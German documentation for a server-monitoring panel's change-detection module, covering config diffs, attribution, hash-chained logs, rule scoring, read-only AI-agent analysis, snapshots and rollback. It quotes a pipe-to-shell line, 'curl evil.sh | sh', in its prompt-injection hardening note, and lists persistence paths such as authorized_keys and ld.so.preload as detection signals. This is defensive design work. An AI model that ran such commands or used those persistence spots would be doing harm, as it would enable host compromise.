# Änderungswahrnehmung

Die überwiegende Mehrheit der Online-Störungen und Eindringlinge beginnt damit, dass „etwas geändert wurde". Herkömmliche Überwachung betrachtet jedoch nur Ergebnis-Kennzahlen (CPU hoch, Festplatte voll) und sieht die Ursache nicht; und der häufigste Satz bei der KI-Fehlersuche lautet: „Ich weiß nicht, was passiert ist, seit es zuletzt in Ordnung war."

Genau diese Ebene ergänzt die Änderungswahrnehmung: **Wer, wann, was, von welchem Zustand in welchen Zustand geändert hat**. Sie zeichnet nur Fakten auf und trifft keine Bewertung – die Bewertung überlassen wir der Regelprüfung und dem Agent.

## Was wird erfasst

Sechs Quellkategorien, alle ausschließlich lesend beobachtet, mittels Polling und Lesen von Systemdateien, ohne Agent-Installation, ohne Änderung der Systemkonfiguration:

| Quelle | Beobachtungsobjekt | Granularität |
|---|---|---|
| Konfigurationsdateien | Hochriskante und gängige Konfigurationen unter `/etc` (nginx, sshd, sudoers, hosts, sysctl, fstab…) | Zeilenweiser Diff |
| Softwarepakete | dpkg / rpm Installation, Upgrade, Deinstallation | Paketname + Versionsänderung |
| Dienststatus | active/failed von systemd-Units, Start/Stopp, Neustart | Unit-Statusübergang |
| Konten und Berechtigungen | Benutzer hinzufügen/entfernen, Gruppenänderungen, sudo-Autorisierung | Konto- und Gruppendifferenzen |
| Firewall-Regeln | iptables / nftables Regelsätze | Regelzeilendifferenzen |
| Geplante Aufgaben | System-crontab, Benutzer-crontab, `/etc/cron.d` | Aufgabenzeilendifferenzen |

Konfigurationsdateien sind der Schwerpunkt und am leichtesten falsch umzusetzen: Es wird eine Baseline anhand des Inhalts-Hashs erstellt; ändert sich die Datei nicht, wird kein Ereignis erzeugt; erst bei Änderung wird ein zeilenweiser Diff berechnet und der Inhalt **maskiert** (`password=`, `api_key=`, private Schlüsselblöcke usw. durch Platzhalter ersetzt) und anschließend in der Datenbank gespeichert.

## Wer hat es geändert: ehrliche Drei-Stufen-Attribution

Eine Attribution kann nicht 100 % genau sein, daher wird keine Genauigkeit vorgetäuscht:

| Konfidenz | Bedeutung | Bewertungsgrundlage |
|---|---|---|
| `confirmed` Bestätigt | Kann einer konkreten Person zugeordnet werden | Zum Änderungszeitpunkt existiert eine eindeutig aktive SSH-Sitzung / ein Panel-Betriebsprotokoll |
| `inferred` Vermutet | Wahrscheinlich wer | Vor oder nach der Änderung war ein bestimmtes Konto angemeldet, oder die Änderung wurde durch eine bekannte Paketmanager-Operation verursacht |
| `unknown` Unbekannt | Nicht bekannt | Keine verwertbaren Hinweise (z. B. eine durch cron ausgelöste Skriptänderung) |

In der Oberfläche wird `inferred` gesondert gekennzeichnet, bei `unknown` wird direkt „Unbekannt“ geschrieben, es wird nicht mit dem Wort „System“ übergangen.

## Manipulationsschutz: Hash-Kette

Jeder Änderungseintrag trägt den Hash des vorherigen Eintrags und bildet so eine Kette. Wird ein Eintrag gelöscht oder verändert, bricht die nachfolgende Prüfung genau an dieser Stelle ab.

- Die Prüfung kann jederzeit oben auf der Seite „Änderungen“ im Panel durchgeführt werden (`变更链校验`)
- Das Prüfergebnis zeigt die Bruchstelle an und dient der Entscheidung, „ob es sich um Datenbeschädigung handelt oder jemand Einträge löscht“
- Bei einer leeren Datenbank oder einem anomalen Anker des ersten Eintrags erfolgt eine Selbstheilung, sodass ein aus früheren Versionen stammender Zustand nicht dauerhaft einen roten Fehler verursacht

## Regelprüfung: Zuerst eine Entscheidung bei 0 Token Kosten

Nachdem jede Änderung eingeht, wird sie zunächst einer **reinen Regelbewertung** unterzogen (ohne Aufruf eines großen Modells), die eine Punktzahl von 0–1 und drei bis fünf Begründungen ausgibt:

| Positivkriterium | Gewichtung |
|---|---|
| Hochrisikopfad (`/etc/passwd`, `authorized_keys`, `sudoers`, `ld.so.preload`, systemd, cron…) | +0.45 |
| Wichtige Konfiguration (nginx, mysql, redis, hosts, sysctl, fstab…) | +0.20 |
| Akteur unbekannt | +0.25 |
| Akteur nur abgeleitet | +0.10 |
| Quelle ist eine öffentliche Adresse | +0.30 |
| root-Änderung über SSH | +0.15 |
| Außerhalb der Arbeitszeit | +0.15 |
| Wochenende | +0.05 |
| Wiederholte Änderung desselben Objekts innerhalb von 1 Stunde | +0.15 |
| Hochrisikoereignis auf dem Host innerhalb von 30 Minuten | +0.35 |
| Der Akteur ändert dieses Objekt zum ersten Mal | +0.10 |
| **Abzug**: Änderungen durch Paketmanager/Systemverzeichnisse | **−0.35** |
| **Abzug**: Paketverwaltungs-/Cache-Verzeichnisse | **−0.10** |

Einstufung:

| Punktzahl | Bewertung | Weiteres Vorgehen |
|---|---|---|
| ≥ 0.55 | **Verdächtig** | Ereignisstufe wird auf high angehoben, Agent zur Tiefenanalyse geweckt |
| 0.30 – 0.55 | Zu bestätigen | Aufzeichnen, nicht an den Agent |
| < 0.30 | Normal | Nur aufzeichnen |

Der Wert dieses Schritts: Die „300 Änderungen durch ein apt-Upgrade" werden automatisch auf „normal" heruntergestuft, und nur die wirklich sehenswerten wenigen Einträge werden dem großen Modell vorgelegt.

## Agent-Tiefenanalyse

Als verdächtig eingestufte Änderungen gelangen mit dem **ursprünglichen Diff** direkt in den Untersuchungskontext des Agenten (zusammen mit dem Ausführenden, der Quell-IP, den betroffenen Feldern und der Anzahl hinzugefügter/entfernter Zeilen). Die Aufgabe, die der Agent erhält, lautet nicht „Ist diese Änderung gefährlich?", sondern:

```
【Bewertung】Normaler Betrieb / Manuelle Bestätigung erforderlich / Hochgradig verdächtig
【Grundlage】Nicht mehr als 5 Punkte, jeder Punkt ein Satz
【Empfehlung】Freigeben / Rückabwicklung eines konkreten Objekts empfohlen (durch Menschen auszuführen, du hast keine Schreibberechtigung)
```

Er wird angeleitet, nach Priorität Beweise zu sammeln: zuerst den Diff selbst prüfen, dann die letzten Anmeldungen des Ausführenden abgleichen und nur bei Bedarf zusätzlich Persistenzorte nachprüfen (`authorized_keys`, cron, systemd, `ld.so.preload`), um abschließend zu beurteilen, ob es sich um eine isolierte Betriebsaktion oder um ein Glied einer Angriffskette handelt.

Das Budget beträgt standardmäßig 12 Schritte / 240 Sekunden / 100.000 Token, die Abkühlzeit 600 Sekunden (dieselbe Kette wird innerhalb von 10 Minuten nur einmal analysiert). **Schreibberechtigung: null**: Änderungsereignisse werden zwangsweise auf shadow herabgestuft, alle Schreibwerkzeuge sind deaktiviert.

> Injektionsschutz: Der Diff-Text ist nicht vertrauenswürdige Eingabe. Vor dem Einspeisen in das Modell wird eine Grenzhärtung durchgeführt – der Text wird in einen Codeblock mit Sentinel eingebettet, die Zaunlänge passt sich dem Inhalt an, und im Text gefälschte Absatzmarkierungen und End-Sentinels werden neutralisiert. **Der Inhalt selbst wird nicht verändert**: Die Zeile `curl evil.sh | sh` muss unverändert dargestellt werden, sie ist die Schlussfolgerung.

## Ignorierregeln

Nicht jede Änderung ist es wert, protokolliert zu werden. Für bekanntes Rauschen (zum Beispiel eine Anwendung, die jede Minute ihre eigene Cache-Datei neu schreibt), können Ignorierregeln hinzugefügt werden:

- Unterstützt glob, `*` matcht eine einzelne Ebene, `**` matcht beliebige Ebenen
- Regeln wirken auf die **Erfassungsebene** – bei einem Treffer wird nicht einmal ein Ereignis erzeugt, es wird nicht „erzeugt und dann verborgen"
- In der Änderungsliste kann mit einem Klick eine Regel aus dem aktuellen Objekt generiert werden

Die Regelverwaltung befindet sich unter „Änderungen → Ignorierregeln", jede Regel kann eine Bemerkung tragen und jederzeit gelöscht werden.

## Snapshots und Rollback

Bei Änderungen an Konfigurationsdateien und kontobezogenen Einstellungen bewahrt OpsMini vor der Änderung einen Snapshot der Originaldatei auf (durch ein Kontingent begrenzt):

- In den Änderungsdetails kann direkt „auf den Stand vor dieser Änderung zurückrollen“ gewählt werden, mit zweiter Bestätigung
- Vor dem Rollback wird erneut ein Snapshot des aktuellen Zustands erstellt, sodass bei einem Fehlschlag erneut zurückgerollt werden kann
- Snapshots werden nach einem doppelten Kontingent aus Anzahl und Gesamtgröße bereinigt, sodass die Festplatte nicht überläuft

## Integration in die Angriffskette

Seit v1.4 können **verdächtige Änderungen als Glied „Persistenz" in die Angriffskette aufgenommen werden**:

- Drei Voraussetzungen müssen gleichzeitig erfüllt sein: Die Regelprüfung stuft die Änderung als verdächtig ein, die Änderung betrifft eine Position, die einen Neustart übersteht, und in der Kette ist bereits „Ausführung" oder „externe Verbindungssteuerung" aufgetreten
- Zeitfenster von 1 Stunde (gleichnamige Änderungen, die älter als 1 Stunde sind, sind eher Betriebsabschlussarbeiten)
- Änderungen sind niemals der Ausgangspunkt einer Angriffskette – eine einzelne Konfigurationsänderung stellt keinen Einbruch dar

Die Bewertungsspalte der Änderungsliste zeigt „In Angriffskette integriert" an; ein Klick springt zur entsprechenden Angriffskette. Auch die Glied-Bezeichnungen der Angriffskette vermerken, ob das jeweilige Glied aus einer „Änderung" oder aus „WebShell / verdächtiger Prozess / externe Verbindung" stammt.

## Standardmäßige Aufbewahrung und Kontingente

| Element | Standard |
|---|---|
| Aufbewahrung von Änderungsmetadaten | 30 Tage |
| Aufbewahrung des diff-Inhalts | 7 Tage |
| Obergrenze für die Gesamtmenge des diff-Inhalts | Konfigurierbar (bei Überschreitung werden die ältesten verdrängt) |
| Anzahl/Gesamtmenge der Snapshots | Konfigurierbar (bei Überschreitung werden die ältesten bereinigt) |

Die Aufbewahrungsrichtlinie kann in den „Panel-Einstellungen" angepasst werden. Bei Ablauf wird nur der diff-Inhalt gelöscht, Metadaten und Hash-Kette bleiben erhalten, sodass die Tatsache „dieser Eintrag hat existiert" selbst nicht ausgelöscht wird.

## Bekannte Einschränkungen

- **Der erste Scan nach einem Neustart führt zu fehlenden Erfassungen**: Die Dateiquelle verwendet den Scan zum Startzeitpunkt als Baseline; Dateiänderungen, die während des Neustarts des Prozesses auftreten, werden nicht als „Änderung" erfasst (da keine vorherige Version zum Vergleich vorliegt). Dies ist kein Bug, sondern das inhärente Verhalten der Hash-Baseline-Prüfung. Um eine bestimmte Datei zu beobachten, warten Sie, bis das Panel mindestens 20 Sekunden stabil läuft, bevor Sie Änderungen vornehmen.
- **Nur Textkonfigurationen werden abgedeckt**: Binärdateien und übermäßig große protokollartige Dateien werden nicht auf Diffs geprüft.
- **Die Zuordnung hängt von den Anmeldeprotokollen ab**: Wenn auf dem Host `wtmp`/`lastlog` geleert werden, degeneriert die Zuordnung zu „Unbekannt" – was selbst ein beachtenswertes Signal ist.

## Beziehung zu anderen Modulen

| Modul | Beziehung |
|---|---|
| [Autonomer Agent (Event-Center)]](autonomous-agent.md) | Verdächtige Änderungen werden hier zu Events und vom Agent analysiert |
| [Host-Sicherheit]](security.md) | Dateiintegritätsüberwachung (FIM) und Änderungswahrnehmung ergänzen sich: FIM achtet darauf, „ob kritische Dateien manipuliert wurden", Änderungswahrnehmung darauf, „was geändert wurde" |
| [Backup und Wiederherstellung]](backup-restore.md) | Backup-/Wiederherstellungsvorgänge selbst sind ebenfalls Änderungsquellen |
| [KI-Assistent]](ai-assistant.md) | Im Dialog kann direkt gefragt werden: „Was wurde in der letzten Stunde geändert?" |
